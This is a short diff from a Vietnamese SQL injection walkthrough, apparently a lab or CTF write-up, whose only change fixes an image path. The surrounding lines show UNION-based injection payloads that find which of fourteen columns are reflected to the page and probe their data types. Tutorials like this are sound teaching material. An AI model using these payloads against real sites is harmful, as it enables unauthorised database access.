@@ -8,7 +8,7 @@ Mục lục:
 	
 2. Vị trí của từng cột dữ liệu trong bảng hiện ở ngoài client (1, 12, 2, 10, 11)
 `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 #`
-![Hinh 1.!](img\1.png)
+![Hinh 1.!](\img\1.png)
 
 3. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (1)
 `' UNION SELECT 'a',NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #` 
